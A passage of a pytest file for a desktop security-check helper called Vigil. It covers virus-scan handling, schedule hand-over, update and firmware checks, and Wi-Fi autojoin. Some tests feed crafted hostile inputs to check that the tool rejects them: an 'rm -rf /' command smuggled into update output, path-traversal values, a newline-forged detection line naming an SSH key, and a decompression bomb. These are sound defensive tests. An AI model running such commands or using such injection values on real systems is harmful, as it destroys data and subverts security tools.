        assert json.loads(child.stdout.readline()) == {"rc": None, "stopped": True}
        assert mod.proc_start(sleeper) is None              # the program it ran is gone too
        assert mod.run_in_progress() is None
    finally:
        child.kill()
        child.wait()


def test_removing_the_plugin_stops_a_run_within_seconds(tmp_path):
    """omarchy plugin remove deletes the helper: a scan it is running stops,
    with the program it started, rather than running on to its deadline."""
    import shutil
    import subprocess as sp
    home = tmp_path / "home"
    home.mkdir(mode=0o700)
    plugin = tmp_path / "plugin" / "bin"
    plugin.mkdir(parents=True)
    helper = plugin / "vigil"
    shutil.copy(REPO / "bin" / "vigil", helper)
    script = tmp_path / "child.py"
    script.write_text(STOP_CHILD)
    child = sp.Popen(["/usr/bin/python3", "-I", str(script), str(helper), str(home)], stdout=sp.PIPE, text=True)
    try:
        assert child.stdout.readline().strip() == "ready"
        mod = load_vigil()
        mod.HOME = str(home)
        for _ in range(50):                                 # until the sleep is recorded
            info = mod._state_json(mod.RUN_FILE) or {}
            if info.get("child"):
                break
            time.sleep(0.05)
        sleeper = info["child"]
        started = time.monotonic()
        shutil.rmtree(tmp_path / "plugin")                  # what removing the plugin does
        assert json.loads(child.stdout.readline()) == {"rc": None, "stopped": True}
        assert time.monotonic() - started < mod.REMOVED_LOOK_SECONDS + 3
        assert mod.proc_start(sleeper) is None              # the program it ran is gone too
    finally:
        child.kill()
        child.wait()


def test_a_removed_plugin_starts_no_further_step(v, monkeypatch):
    clamscan_ok(v)
    monkeypatch.setattr(v, "SELF", str(Path(v.HOME, "gone", "vigil")))
    ran = []
    monkeypatch.setattr(v, "refresh_virus_scan", lambda cb: ran.append("virus-scan"))
    try:
        out = v.refresh_due_feeds(scan_only=True)
    finally:
        v.STOP["on"] = False
    assert ran == [] and out["stopped"] is True


def test_stop_ends_a_program_left_behind_by_a_killed_run(tmp_path):
    import subprocess as sp
    home = tmp_path / "home"
    home.mkdir(mode=0o700)
    script = tmp_path / "child.py"
    script.write_text(STOP_CHILD)
    child = sp.Popen(["/usr/bin/python3", "-I", str(script), str(REPO / "bin" / "vigil"), str(home)],
                     stdout=sp.PIPE, text=True)
    assert child.stdout.readline().strip() == "ready"
    mod = load_vigil()
    mod.HOME = str(home)
    for _ in range(50):
        info = mod._state_json(mod.RUN_FILE) or {}
        if info.get("child"):
            break
        time.sleep(0.05)
    child.kill()                                            # the shell went away hard
    child.wait()
    assert mod.run_in_progress() is not None                # the sleep still holds the lock
    assert mod.stop_run()["message"] == "Stopped."
    assert mod.run_in_progress() is None


# --------------------------------------------------------------------------
# Duplicate scan schedules

def other_schedules(v):
    return next(c for c in v.audit(peek=True)["checks"] if c["id"] == "other-schedules")


def clamui_timer_on(v, settings):
    wants = Path(v.HOME, ".config/systemd/user/timers.target.wants")
    wants.mkdir(parents=True, exist_ok=True)
    (wants / "clamui-scheduled-scan.timer").symlink_to("../clamui-scheduled-scan.timer")
    if settings is not None:
        put(Path(v.HOME, ".config/clamui/settings.json"), json.dumps(settings))


def test_nothing_scheduled_twice(v):
    c = other_schedules(v)
    assert c["status"] == "pass" and c["undo"]["action"] == "" and c["category"] == "detect"


def test_clamui_home_scan_is_offered_for_hand_over(v):
    clamui_timer_on(v, {"scheduled_scans_enabled": True, "schedule_frequency": "weekly", "schedule_time": "02:00",
                        "schedule_day_of_week": 6, "schedule_targets": [v.HOME + "/Downloads", "~/Documents"]})
    c = other_schedules(v)
    assert c["status"] == "info" and c["weight"] == 0
    assert c["fix"] == {"kind": "terminal", "action": "hand-over-schedules", "label": "Let Vigil run them"}
    assert "ClamUI scans your home folder every Sunday at 02:00." in c["detail"]
    assert c["summary"] == "1 other scheduled scan also runs what Vigil runs."


def test_clamui_scans_beyond_home_or_unreadable_are_left_alone(v):
    clamui_timer_on(v, {"scheduled_scans_enabled": True, "schedule_frequency": "daily",
                        "schedule_targets": [v.HOME, "/srv/data"]})
    c = other_schedules(v)
    assert c["status"] == "pass" and "outside your home folder" in c["detail"]
    put(Path(v.HOME, ".config/clamui/settings.json"), "{not json")
    c = other_schedules(v)
    assert c["status"] == "pass" and "could not read which folders" in c["detail"]
    for evil in (["/home/../etc"], [v.HOME + "/../other"]):
        put(Path(v.HOME, ".config/clamui/settings.json"), json.dumps(
            {"scheduled_scans_enabled": True, "schedule_targets": evil}))
        assert other_schedules(v)["status"] == "pass", evil


def test_clamui_is_judged_by_both_installs_which_share_one_timer(v):
    """As in the hand-over script: the Arch ClamUI's home-only scan is not
    offered while the Flatpak ClamUI's schedule reaches outside the home folder,
    or while either settings file is a link or cannot be read."""
    clamui_timer_on(v, {"scheduled_scans_enabled": True, "schedule_targets": ["~/Downloads"]})
    assert other_schedules(v)["status"] == "info"
    flat = Path(v.HOME, ".var/app/io.github.linx_systems.ClamUI/config/clamui/settings.json")
    put(flat, json.dumps({"scheduled_scans_enabled": True, "schedule_targets": ["~/Pictures", "/srv"]}))
    c = other_schedules(v)
    assert c["status"] == "pass" and "outside your home folder" in c["detail"]
    put(flat, json.dumps({"scheduled_scans_enabled": False, "schedule_targets": ["/srv"]}))
    assert other_schedules(v)["status"] == "info"                      # switched off there: no reason to hold back
    for bad in ("{not json", "[]"):
        put(flat, bad)
        c = other_schedules(v)
        assert c["status"] == "pass" and "could not read which folders" in c["detail"], bad
    flat.unlink()
    flat.symlink_to(Path(v.HOME, ".config/clamui/settings.json"))
    assert other_schedules(v)["status"] == "pass"


def test_bumblebee_plugin_counts_only_when_on_and_vigil_runs_bumblebee(v):
    pid = "io.github.duketopceo.bumblebee"
    Path(v.HOME, ".config/omarchy/plugins", pid).mkdir(parents=True)
    put(Path(v.HOME, ".config/omarchy/shell.json"), json.dumps({"bar": {"layout": {"right": [{"id": pid}]}}}))
    assert other_schedules(v)["status"] == "pass"                      # Vigil has no Bumblebee yet
    v.TRUSTED.add(v.ROOT + "/usr/local/bin/bumblebee")
    c = other_schedules(v)
    assert c["status"] == "info" and "Bumblebee plugin" in c["detail"]
    put(Path(v.HOME, ".config/omarchy/shell.json"), json.dumps({"disabledPlugins": [pid], "plugins": [{"id": pid}]}))
    assert other_schedules(v)["status"] == "pass"                      # you switched it off yourself
    put(Path(v.HOME, ".config/omarchy/shell.json"), json.dumps({"plugins": [{"id": pid + ".fork"}]}))
    assert other_schedules(v)["status"] == "pass"                      # a different id is not a match


def test_security_scan_is_listed_but_kept(v):
    wants = Path(v.HOME, ".config/systemd/user/timers.target.wants")
    wants.mkdir(parents=True)
    (wants / "qs-security-scan.timer").symlink_to("../qs-security-scan.timer")
    c = other_schedules(v)
    assert c["status"] == "pass" and "AUR-Malware" in c["detail"]


def test_hand_over_markers_bring_undo(v):
    marks = Path(v.HOME, ".local/state/omarchy-vigil/handed-over")
    marks.mkdir(parents=True)
    (marks / "clamui-timer").write_text("")
    (marks / "unexpected").write_text("")
    (marks / "bumblebee-plugin").symlink_to(marks / "clamui-timer")     # a planted link records nothing
    assert v.handover_marks() == ["clamui-timer"]
    assert other_schedules(v)["undo"] == {"action": "undo-schedules", "label": "Turn them back on"}


# --------------------------------------------------------------------------
# Ignoring a virus detection you know is safe

def scanned_with(v, *files):
    """A finished virus scan that found these files (real files in the fake home)."""
    found = []
    for rel, body in files:
        p = Path(v.HOME, rel)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(body)
        found.append({"path": "~/" + rel, "signature": "Win.Trojan.Agent-1", "file": str(p)})
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    v.save_feed("virus-scan", {"found": found, "scanned": "~", "files": 10})
    return found


def test_ignore_one_detection_keeps_the_others(v):
    game, other = scanned_with(v, ("Games/witcher/dx11.dll", b"MZ game"), ("Downloads/crack.exe", b"MZ bad"))
    c = v.check_virus_scan()
    assert c["status"] == "fail" and c["summary"].startswith("2 infected files")
    ids = [i["id"] for i in c["items"]]
    assert all(len(i) == 16 for i in ids) and ids[0] != ids[1]
    assert v.set_ignored(ids[0], True)["message"].startswith("Marked as a false positive.")
    c = v.check_virus_scan()
    assert c["status"] == "fail" and c["summary"].startswith("1 infected file.") and "1 marked as a false positive" in c["summary"]
    assert "dx11.dll" not in c["detail"] and "crack.exe" in c["detail"]
    assert [i["ignored"] for i in c["items"]] == [True, False]
    assert v.feed_findings()[0].startswith("1 infected file in")
    v.set_ignored(ids[1], True)
    c = v.check_virus_scan()
    assert c["status"] == "pass" and "2 marked as a false positive" in c["summary"]
    assert v.set_ignored(ids[0], False)["message"] == "Counting it again."
    assert v.check_virus_scan()["status"] == "fail"


def test_a_changed_file_is_reported_again(v):
    (game,) = scanned_with(v, ("Games/witcher/dx11.dll", b"MZ game"))
    did = v.check_virus_scan()["items"][0]["id"]
    v.set_ignored(did, True)
    assert v.check_virus_scan()["status"] == "pass"
    Path(game["file"]).write_bytes(b"MZ something else")             # replaced: same name, new content
    assert v.check_virus_scan()["status"] == "fail"
    Path(game["file"]).write_bytes(b"MZ game")                       # the same bytes again: ignored again
    assert v.check_virus_scan()["status"] == "pass"
    Path(game["file"]).unlink()
    Path(game["file"]).symlink_to("/etc/hostname")                   # a link in its place never counts
    assert v.check_virus_scan()["status"] == "fail"


def test_ignore_refuses_what_it_cannot_tie_to_a_file(v):
    scanned_with(v, ("Games/dx11.dll", b"MZ"))
    assert v.set_ignored("0" * 16, True)["ok"] is False                       # not in the last scan
    assert v.set_ignored("not-an-id", True)["ok"] is False
    v.save_feed("virus-scan", {"found": [{"path": "~/old.exe", "signature": "Win.X-1"}], "scanned": "~"})
    item = v.check_virus_scan()["items"][0]
    assert item["id"] == "" and item["ignored"] is False                       # no such file: no Ignore
    Path(v.HOME, "old.exe").write_bytes(b"MZ")                                 # scan from before 0.19, file there
    item = v.check_virus_scan()["items"][0]
    assert len(item["id"]) == 16 and v.set_ignored(item["id"], True)["ok"] is True
    assert v.check_virus_scan()["status"] == "pass"
    assert v.main(["vigil", "ignore", "../../etc"]) == 2


def test_ignored_list_is_validated(v):
    (game,) = scanned_with(v, ("Games/dx11.dll", b"MZ"))
    did = v.check_virus_scan()["items"][0]["id"]
    put(Path(v.HOME, ".local/state/omarchy-vigil/ignored-detections.json"),
        json.dumps({"ignored": [{"id": did, "sha256": "zz", "stat": None}]}))
    assert v.check_virus_scan()["status"] == "fail"                            # a bad entry ignores nothing


def test_ignoring_does_not_raise_a_new_finding_notification(v):
    scanned_with(v, ("Games/dx11.dll", b"MZ game"), ("Downloads/crack.exe", b"MZ bad"))
    v.audit()                                                              # first run: everything is "seen"
    v.audit()
    did = v.check_virus_scan()["items"][0]["id"]
    v.set_ignored(did, True)
    assert "virus-scan" not in v.audit()["new"]
    v.set_ignored(did, False)
    assert "virus-scan" not in v.audit()["new"]


# --------------------------------------------------------------------------
# Waiting updates (checkupdates) and firmware (fwupd)

CHECKUPDATES_OUT = ("linux 6.18.1.arch1-1 -> 6.18.2.arch1-1\n"
                    "omarchy 4.0.2-1 -> 4.1.0-1\n"
                    "firefox 140.0-1 -> 140.0.1-1\n"
                    "weird line\n")


def updates_tools(v):
    v.TRUSTED |= {v.ROOT + "/usr/bin/checkupdates", v.ROOT + "/usr/bin/pacman"}


def test_parse_checkupdates():
    mod = load_vigil()
    assert mod.parse_checkupdates(CHECKUPDATES_OUT) == [
        ("linux", "6.18.1.arch1-1", "6.18.2.arch1-1"), ("omarchy", "4.0.2-1", "4.1.0-1"),
        ("firefox", "140.0-1", "140.0.1-1")]
    assert mod.parse_checkupdates("x; rm -rf / 1 -> 2\n\x1b[31mred 1 -> 2\n") == []


def test_an_omarchy_update_waiting_asks_to_update(v):
    updates_tools(v)
    two_days_ago = time.strftime("%Y-%m-%d", time.localtime(time.time() - 2 * 86400))
    sysfile(v, "/var/log/pacman.log", "[%sT10:00:00+0000] [PACMAN] starting full system upgrade\n" % two_days_ago)
    v.COMMANDS[("/usr/bin/checkupdates", "--nocolor")] = (0, CHECKUPDATES_OUT)
    assert v.refresh_pending_updates() == "3 updates waiting."
    c = v.check_updates()
    assert c["status"] == "warn" and c["fix"]["action"] == "update"
    assert c["summary"] == "Omarchy 4.1.0-1 is out; you have 4.0.2-1. 2 other updates waiting too."
    v.COMMANDS[("/usr/bin/checkupdates", "--nocolor")] = (0, "linux 1-1 -> 2-1\n")
    v.refresh_pending_updates()
    c = v.check_updates()
    assert c["status"] == "pass" and c["summary"].endswith("1 update waiting.")
    v.COMMANDS[("/usr/bin/checkupdates", "--nocolor")] = (2, "")              # 2: nothing waiting
    v.refresh_pending_updates()
    assert v.check_updates()["status"] == "pass"
    v.COMMANDS[("/usr/bin/checkupdates", "--nocolor")] = (1, "")              # offline: an error, kept as before
    with pytest.raises(v.Refused):
        v.refresh_pending_updates()


def test_an_update_check_from_before_the_last_update_is_ignored(v):
    updates_tools(v)
    v.COMMANDS[("/usr/bin/checkupdates", "--nocolor")] = (0, CHECKUPDATES_OUT)
    v.refresh_pending_updates()
    later = time.strftime("%Y-%m-%d", time.localtime(time.time() + 86400))
    sysfile(v, "/var/log/pacman.log", "[%sT10:00:00+0000] [PACMAN] starting full system upgrade\n" % later)
    assert v.check_updates()["status"] == "pass"                               # you updated since: no nag


FWUPD_JSON = json.dumps({"Devices": [
    {"Name": "System Firmware", "Version": "1.10.0", "Releases": [
        {"Version": "1.12.0", "Urgency": "high", "Issues": ["CVE-2026-1111"]}, {"Version": "1.11.0"}]},
    {"Name": "SSD", "Version": "3B2QGXA7", "Releases": [{"Version": "3B4QGXA7", "Urgency": "low"}]},
    {"Name": "Touchpad", "Version": "1.0"}]})
FWUPD_GET = ("/usr/bin/fwupdmgr", "get-updates", "--json", "--no-unreported-check", "--no-metadata-check")


def test_parse_fwupd_updates():
    mod = load_vigil()
    assert mod.parse_fwupd_updates(FWUPD_JSON) == [
        {"device": "System Firmware", "from": "1.10.0", "to": "1.12.0", "security": True},
        {"device": "SSD", "from": "3B2QGXA7", "to": "3B4QGXA7", "security": False}]
    assert mod.parse_fwupd_updates("nope") is None
    assert mod.parse_fwupd_updates('{"Devices": "x"}') is None


def test_firmware_states(v):
    c = v.check_firmware()
    assert c["status"] == "info" and c["fix"]["action"] == "install-helpers"
    v.TRUSTED.add(v.ROOT + "/usr/bin/fwupdmgr")
    assert v.check_firmware()["summary"] == "Checked in the next weekly check."
    v.COMMANDS[FWUPD_GET] = (0, FWUPD_JSON)
    v.refresh_firmware()
    c = v.check_firmware()
    assert c["status"] == "warn" and c["weight"] == 2 and c["fix"]["action"] == "update-firmware"
    assert "System Firmware: 1.10.0 -> 1.12.0 (security fix)" in c["detail"]
    v.COMMANDS[FWUPD_GET] = (0, json.dumps({"Devices": [{"Name": "SSD", "Version": "1",
                                                         "Releases": [{"Version": "2"}]}]}))
    v.refresh_firmware()
    c = v.check_firmware()
    assert c["status"] == "info" and c["weight"] == 0
    v.COMMANDS[FWUPD_GET] = (2, "No updatable devices")                    # 2: nothing to do
    v.refresh_firmware()
    assert v.check_firmware()["status"] == "pass"
    v.COMMANDS[FWUPD_GET] = (1, "")
    with pytest.raises(v.Refused):
        v.refresh_firmware()
    assert v.check_firmware()["status"] == "pass"                           # the last good result stays


def test_full_scan_checks_firmware_before_the_virus_scan(v, capsys, monkeypatch):
    v.PROGRESS["on"] = True
    v.TRUSTED.add(v.ROOT + "/usr/bin/fwupdmgr")
    monkeypatch.setattr(v, "refresh_firmware", lambda: "ok")
    clamscan_ok(v)
    v.refresh_due_feeds(full=True)
    steps = [json.loads(l)["progress"]["doing"] for l in capsys.readouterr().out.splitlines() if '"progress"' in l]
    assert steps.index("Firmware lookup") < steps.index("Virus scan of ~")
    v.PROGRESS["on"] = False


def test_daily_check_checks_for_waiting_updates(v, capsys):
    updates_tools(v)
    v.COMMANDS[("/usr/bin/checkupdates", "--nocolor")] = (2, "")
    v.PROGRESS["on"] = True
    v.refresh_due_feeds(weekly_only=True)                                  # the weekly check: not this
    steps = [json.loads(l)["progress"]["doing"] for l in capsys.readouterr().out.splitlines() if '"progress"' in l]
    assert "System update lookup" not in steps
    v.refresh_due_feeds(daily_only=True)
    steps = [json.loads(l)["progress"]["doing"] for l in capsys.readouterr().out.splitlines() if '"progress"' in l]
    assert "System update lookup" in steps
    v.PROGRESS["on"] = False
    assert any(s["id"] == "pending-updates" and s["state"] == "ok" for s in v.source_status())


# --------------------------------------------------------------------------
# Nothing loops, nothing repeats hours of work

def test_an_unexpected_error_still_counts_as_tried(v, monkeypatch):
    updates_tools(v)

    def boom():
        raise ValueError("a bug")
    monkeypatch.setitem(v.FEED_REFRESH, "pending-updates", boom)
    out = v.refresh_due_feeds()
    assert out["ok"] is False
    assert v.feed_due("pending-updates") is False                 # tried today: not started again until tomorrow


def test_a_virus_scan_that_runs_out_of_time_waits_a_week(v, monkeypatch):
    clamscan_ok(v)
    monkeypatch.setattr(v, "VIRUS_SCAN_SECONDS", 3600)
    clock = [0.0]                                                   # the start, then an hour later
    monkeypatch.setattr(v.time, "monotonic", lambda: clock.pop() if clock else 3600.0)
    v.COMMANDS[scan_argv(v)] = (None, "")                           # killed at the deadline
    monkeypatch.setattr(v, "count_home_files", lambda **kw: 10)
    with pytest.raises(v.TimedOut):
        v.refresh_virus_scan()
    meta = json.loads(Path(v.HOME, ".local/state/omarchy-vigil/virus-scan.json").read_text())
    assert meta["retryDays"] == v.FEED_DAYS
    assert v._due_at(meta) is not None                              # not due tomorrow
    assert (v._due_at(meta) - v.datetime.now()).days >= v.FEED_DAYS - 1


def test_a_quick_failure_is_still_retried_tomorrow(v, monkeypatch):
    clamscan_ok(v, rc=2)
    monkeypatch.setattr(v, "count_home_files", lambda **kw: 10)
    with pytest.raises(v.Refused) as e:
        v.refresh_virus_scan()
    assert not isinstance(e.value, v.TimedOut)
    meta = json.loads(Path(v.HOME, ".local/state/omarchy-vigil/virus-scan.json").read_text())
    assert "retryDays" not in meta and (v._due_at(meta) - v.datetime.now()).days < 1


def test_progress_shares_give_the_virus_scan_most_of_the_bar(v, capsys, monkeypatch):
    v.PROGRESS["on"] = True
    clamscan_ok(v)
    monkeypatch.setattr(v, "refresh_virus_scan", lambda cb: cb(50, 100))
    updates_tools(v)
    v.COMMANDS[("/usr/bin/checkupdates", "--nocolor")] = (2, "")
    v.refresh_due_feeds(full=True)
    lines = [json.loads(l)["progress"] for l in capsys.readouterr().out.splitlines() if '"progress"' in l]
    scan = [p for p in lines if p["doing"] == "Virus scan of ~"][-1]
    assert scan["span"] >= 0.8 and abs(scan["at"] + scan["span"] - 1) < 0.001
    firsts = {}
    for p in lines:
        firsts.setdefault(p["step"], p)
    assert abs(sum(p["span"] for p in firsts.values()) - 1) < 0.01         # the shares fill the bar exactly
    v.PROGRESS["on"] = False


def test_catalog_archive_is_unpacked_with_a_hard_cap(v, monkeypatch):
    import gzip
    monkeypatch.setattr(v, "CATALOG_TAR_MAX", 1024 * 1024)
    # A tiny download that unpacks to far more than the cap (like a huge PAX header) is refused
    # before tarfile reads any of it.
    bomb = gzip.compress(b"\0" * (8 * 1024 * 1024))
    assert len(bomb) < 64 * 1024
    assert v.catalog_from_tarball(bomb) is None
    assert v.catalog_from_tarball(tarball({"bumblebee-main/threat_intel/a.json": CAT_A}))["entries"]



def test_a_file_name_with_a_line_break_cannot_fake_a_detection(v):
    key = Path(v.HOME, ".ssh/id_ed25519")
    key.parent.mkdir(parents=True)
    key.write_text("secret")
    evil = Path(v.HOME, "Downloads", "x\n%s: Win.Trojan.Agent-1 FOUND\ny" % key)
    evil.parent.mkdir(parents=True)
    try:
        Path(v.HOME, "Downloads", "x\n").mkdir(parents=True, exist_ok=True)
    except OSError:
        pass
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    # The scan prints the odd name as it is, which reads like a detection of the SSH key.
    v.COMMANDS[scan_argv(v)] = (1, "%s/Downloads/x\n%s: Win.Trojan.Agent-1 FOUND\ny: OK\n" % (v.HOME, key))
    v.COMMANDS[confirm_argv([str(key)])] = (0, "%s: OK\n" % key)             # scanned by itself: clean
    odd_name = Path(v.HOME, "Downloads/x\ny")
    odd_name.write_text("")
    v.refresh_virus_scan()
    c = v.check_virus_scan()
    assert "id_ed25519" not in c["detail"] or c["status"] != "fail"
    assert c["status"] == "warn" and "line break" in c["summary"]
    assert "~/Downloads/x\\ny" in c["detail"]


def test_too_many_detections_do_not_break_the_scan(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    lines = "".join("%s/f%d: Win.X-1 FOUND\n" % (v.HOME, i) for i in range(2000))
    v.COMMANDS[scan_argv(v)] = (1, lines)
    v.refresh_virus_scan()                                                  # does not fail
    assert v.check_virus_scan()["status"] in ("pass", "fail")



def test_checkupdates_keeps_its_databases_in_the_private_state_folder(v):
    updates_tools(v)
    v.COMMANDS[("/usr/bin/checkupdates", "--nocolor")] = (2, "")
    v.refresh_pending_updates()
    assert {"CHECKUPDATES_DB": v.HOME + "/.local/state/omarchy-vigil/checkup-db"} in v.ENVS
    assert oct(Path(v.HOME, ".local/state/omarchy-vigil").stat().st_mode & 0o777) == "0o700"



# --------------------------------------------------------------------------
# Bumblebee: the version pinned in the reviewed code

def bee_installed(v, version="0.1.2"):
    v.TRUSTED |= {v.ROOT + "/usr/local/bin/bumblebee", v.ROOT + "/usr/bin/curl"}
    v.COMMANDS[("/usr/local/bin/bumblebee", "version")] = (0, "bumblebee v%s\ncommit: x\n" % version)
    v.save_feed("bumblebee", {"findings": [], "status": "complete"})


def test_the_bumblebee_row_offers_the_pinned_version_only_when_older(v):
    bee_installed(v, v.BUMBLEBEE_VERSION)
    assert v.check_bumblebee()["status"] == "pass"
    bee_installed(v, "0.1.1")
    c = v.check_bumblebee()
    assert c["status"] == "info" and c["fix"] == {"kind": "terminal", "action": "update-bumblebee",
                                                  "label": "Install Bumblebee " + v.BUMBLEBEE_VERSION}
    assert c["summary"] == "Bumblebee 0.1.1 is installed; this Vigil was reviewed with %s." % v.BUMBLEBEE_VERSION
    assert "No check updates Bumblebee by itself" in c["howto"]
    bee_installed(v, "9.0.0")                                                 # newer than the pin: left alone
    assert v.check_bumblebee()["status"] == "pass"


def test_bumblebee_is_pinned_in_the_reviewed_code(v):
    s = v.BUMBLEBEE_SCRIPT
    assert re.fullmatch(r"\d+\.\d+\.\d+", v.BUMBLEBEE_VERSION)
    for arch, sha in v.BUMBLEBEE_SHA256.items():
        assert re.fullmatch(r"[0-9a-f]{64}", sha) and ("a=%s; want=%s" % (arch, sha)) in s
    # Nothing from the network decides what is installed: no release list, no checksums.txt.
    assert "api.github.com" not in s and "checksums.txt" not in s and "jq" not in s
    assert "v=" + v.BUMBLEBEE_VERSION + "\n" in s
    # The download is capped in bytes while it streams, not only by Content-Length.
    assert s.startswith("set -o pipefail\n")
    assert "| /usr/bin/head -c %d > " % (v.BUMBLEBEE_MAX_BYTES + 1) in s
    assert "-gt %d ]" % v.BUMBLEBEE_MAX_BYTES in s
    assert "/usr/bin/curl -q -fsSL --proto =https --proto-redir =https --max-time 180 --max-filesize" in s


def test_no_run_installs_or_updates_bumblebee(v, monkeypatch):
    bee_installed(v, "0.1.1")                                                 # older than the pin
    v.TRUSTED |= {v.ROOT + "/usr/bin/pkexec", v.ROOT + "/usr/bin/bash", v.ROOT + "/usr/bin/freshclam"}
    clamscan_ok(v)
    monkeypatch.setattr(v, "count_home_files", lambda **kw: 1)
    v.COMMANDS[tuple(v.NO_PASSWORD_ARGV)] = (0, "")
    calls = []
    real = v.run
    v.run = lambda argv, **kw: (calls.append(tuple(argv)), real(argv, **kw))[1]
    for kw in ({}, {"daily_only": True}, {"weekly_only": True}, {"full": True}, {"scan_only": True}):
        v.refresh_due_feeds(**kw)
    assert not any("bumblebee" in " ".join(c) and c[0] == "/usr/bin/pkexec" for c in calls)
    assert [c for c in calls if c[0] == "/usr/bin/pkexec"] == [tuple(v.NO_PASSWORD_ARGV)]   # Run all only


def test_the_cards_show_the_helpers_root_steps_exactly(v):
    """The run cards show the helper's two root steps; they must be the very
    scripts the helper starts."""
    import subprocess as sp
    js = json.loads(sp.run(["node", "-e", """
const M = require(process.argv[1])
process.stdout.write(JSON.stringify({ sig: M.SIGNATURES_SCRIPT, nopw: M.NO_PASSWORD_STEP }))
""", str(REPO / "Model.js")], capture_output=True, text=True, check=True).stdout)
    assert js["sig"] == v.SIGNATURES_SCRIPT and v.SIGNATURES_ARGV == [v.PKEXEC, "/usr/bin/bash", "-c", js["sig"]]
    assert js["nopw"] == v.ROOT_STEP and v.NO_PASSWORD_ARGV == [v.PKEXEC, "/usr/bin/bash", "-c", js["nopw"]]


def test_every_omarchy_command_a_script_uses_is_one_the_helper_looks_up(v):
    """Scripts name Omarchy's commands by absolute path, from the helper's trusted lookup."""
    uses = set(re.findall(r'"(omarchy-[a-z0-9-]+)"', " ".join(re.findall(r"uses: \[([^\]]*)\]",
                                                                       (REPO / "Model.js").read_text()))))
    assert uses == {"omarchy-plugin-disable", "omarchy-plugin-enable"}
    for name in uses:
        v.TRUSTED.add(v.ROOT + "/usr/share/omarchy/bin/" + name)
    tools = v.audit(peek=True)["tools"]
    for name in uses:
        assert tools[name] == "/usr/share/omarchy/bin", name


def test_the_install_script_is_the_same_in_the_panel_and_the_helper(v):
    import subprocess as sp
    js = sp.run(["node", "-e", "process.stdout.write(require(process.argv[1]).BUMBLEBEE_INSTALL)",
                 str(REPO / "Model.js")], capture_output=True, text=True, check=True).stdout
    assert js == v.BUMBLEBEE_SCRIPT
    assert "/usr/local/bin/bumblebee version" not in js and "bumblebee version" not in js   # never run as root


# --------------------------------------------------------------------------
# Flatpak apps

def flatpak_apps(v, user=True, system=False):
    v.TRUSTED.add(v.ROOT + "/usr/bin/flatpak")
    if user:
        Path(v.HOME, ".local/share/flatpak/app/io.github.linx_systems.ClamUI").mkdir(parents=True)
    if system:
        Path(v.ROOT, "var/lib/flatpak/app/org.mozilla.firefox").mkdir(parents=True)


def test_flatpak_updates_are_checked_and_shown(v):
    assert v.check_flatpak()["status"] == "na"                              # no Flatpak apps
    flatpak_apps(v, system=True)
    v.COMMANDS[("/usr/bin/flatpak", "remote-ls", "--user", "--updates", "--columns=application")] = (
        0, "io.github.linx_systems.ClamUI\n<b>not an id</b>\n")
    v.COMMANDS[("/usr/bin/flatpak", "remote-ls", "--system", "--updates", "--columns=application")] = (0, "")
    v.refresh_flatpak()
    c = v.check_flatpak()
    assert c["status"] == "warn" and c["fix"]["action"] == "update-flatpaks"
    assert c["detail"] == "io.github.linx_systems.ClamUI (just you)"
    v.COMMANDS[("/usr/bin/flatpak", "remote-ls", "--user", "--updates", "--columns=application")] = (0, "")
    v.refresh_flatpak()
    assert v.check_flatpak()["status"] == "pass"
    v.COMMANDS[("/usr/bin/flatpak", "remote-ls", "--user", "--updates", "--columns=application")] = (1, "")
    with pytest.raises(v.Refused):
        v.refresh_flatpak()


def test_daily_check_and_run_all_update_your_own_flatpak_apps(v, capsys):
    flatpak_apps(v)
    v.COMMANDS[("/usr/bin/flatpak", "update", "--user", "--noninteractive")] = (0, "")
    v.COMMANDS[("/usr/bin/flatpak", "remote-ls", "--user", "--updates", "--columns=application")] = (0, "")
    calls = []
    real = v.run
    v.run = lambda argv, **kw: (calls.append(tuple(argv)), real(argv, **kw))[1]
    v.refresh_due_feeds(daily_only=True)
    assert ("/usr/bin/flatpak", "update", "--user", "--noninteractive") in calls
    calls.clear()
    v.refresh_due_feeds(full=True)
    assert ("/usr/bin/flatpak", "update", "--user", "--noninteractive") in calls
    calls.clear()
    v.refresh_due_feeds()                                                   # the background run: check only
    assert ("/usr/bin/flatpak", "update", "--user", "--noninteractive") not in calls


# --------------------------------------------------------------------------
# Open Wi-Fi that joins by itself

def saved_networks(v, nets):
    """nets: {uuid: (name, key_mgmt, autoconnect)}"""
    v.TRUSTED.add(v.ROOT + "/usr/bin/nmcli")
    v.UNITS[("is-active", "NetworkManager.service")] = "active"
    lines = "".join("%s:802-11-wireless:%s:%s\n" % (u, ac, name.replace(":", "\\:")) for u, (name, _, ac) in nets.items())
    v.COMMANDS[("/usr/bin/nmcli", "-t", "-f", "UUID,TYPE,AUTOCONNECT,NAME", "connection", "show")] = (0, lines)
    for u, (_, key, _) in nets.items():
        v.COMMANDS[("/usr/bin/nmcli", "-g", "802-11-wireless-security.key-mgmt", "connection", "show", u)] = (0, key + "\n")


def U(n):
    return "0000000%d-0000-4000-8000-00000000000%d" % (n, n)


def test_open_wifi_that_joins_by_itself(v):
    assert v.check_open_wifi()["status"] == "na"
    saved_networks(v, {U(1): ("Cafe: Free", "", "yes"), U(2): ("Home", "wpa-psk", "yes"),
                       U(3): ("Old", "none", "yes"), U(4): ("Airport", "", "no"), U(5): ("Station", "owe", "yes")})
    c = v.check_open_wifi()
    assert c["status"] == "warn" and c["fix"]["action"] == "wifi-autojoin-off"
    assert c["detail"].splitlines() == ["Cafe: Free (no password)", "Old (old WEP encryption)"]
    assert c["summary"] == "2 saved open networks join by themselves."
    saved_networks(v, {U(2): ("Home", "sae", "yes")})
    c = next(x for x in v.audit(peek=True)["checks"] if x["id"] == "open-wifi")
    assert c["status"] == "pass" and c["undo"]["action"] == ""
    mark = Path(v.HOME, ".local/state/omarchy-vigil/wifi-autojoin-off")
    mark.parent.mkdir(parents=True, exist_ok=True)
    mark.write_text(U(1) + "\n")
    c = next(x for x in v.audit(peek=True)["checks"] if x["id"] == "open-wifi")
    assert c["undo"]["action"] == "undo-wifi-autojoin"


# --------------------------------------------------------------------------
# The daily check

def downloads_argv(v):
    return ("/usr/bin/nice", "-n", "19", "/usr/bin/clamscan", "--no-summary", "--stdout",
            "--follow-file-symlinks=0", "--file-list=" + v.HOME + "/.local/state/omarchy-vigil/downloads-scan.list")


def test_the_daily_scan_reads_only_what_is_new_in_downloads(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
